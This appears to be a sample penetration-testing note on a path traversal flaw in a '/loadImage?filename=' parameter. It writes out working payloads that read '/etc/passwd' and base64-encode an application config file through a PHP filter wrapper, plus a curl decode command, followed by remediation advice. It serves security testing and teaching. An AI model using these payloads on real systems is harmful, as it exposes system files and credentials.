# Path Traversal — Sample Note

## Target
- Example: `https://example.com/loadImage?filename=218.png`
- Parameter: `filename` (GET)

## Summary
The `filename` parameter in `/loadImage` is a potential path traversal vector. Using directory traversal sequences and PHP stream filters we can test for disclosure of server files.

## Discovery
1. Observed parameter: `filename=218.png` used to load images.
2. Injected a traversal probe: `filename=../../../../etc/passwd` and observed a 200 response with `text/plain` content-type containing `root:x:` snippets — confirming traversal.

## Exploitation steps
1. Basic probe:

```
GET /loadImage?filename=../../../../etc/passwd HTTP/1.1
Host: example.com
```

2. If binary output or filtering prevents plain text, use PHP wrapper to force base64 output:

```
GET /loadImage?filename=php://filter/convert.base64-encode/resource=../../app/config.php
```

Then decode locally:

```bash
curl -s "https://example.com/loadImage?filename=php://filter/convert.base64-encode/resource=../../app/config.php" | base64 -d
```

## Evidence
- Paste response excerpts or screenshots here. Keep the exact request with headers.

## Remediation
- Resolve and canonicalize paths server-side and ensure requested path is under the allowed base directory.
- Prefer mapping IDs to known filenames instead of accepting raw filenames.

## References
- PortSwigger Academy — Directory traversal modules
- OWASP — Path Traversal
